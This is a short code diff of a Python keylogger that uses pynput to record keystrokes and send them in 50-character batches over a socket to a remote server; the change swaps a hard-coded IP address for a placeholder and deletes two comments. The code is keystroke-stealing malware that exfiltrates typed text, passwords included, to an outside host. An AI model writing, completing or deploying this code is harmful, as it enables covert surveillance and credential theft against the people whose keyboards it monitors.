@@ -2,7 +2,7 @@ from pynput import keyboard
 import socket
 
 text = ""
-ip_address = "192.168.10.49"
+ip_address = "server_ip"
 port_number = 8080
 
 def send_text_over_socket(text_to_send):
@@ -28,10 +28,8 @@ def on_press(key):
         else:
             text += str(key.char)
     except AttributeError:
-        # Handle special keys like Key.enter, Key.backspace, etc.
         pass
 
-    # You may want to limit the length of text to avoid sending too much data at once
     if len(text) >= 50:
         send_text_over_socket(text)
         text = ""
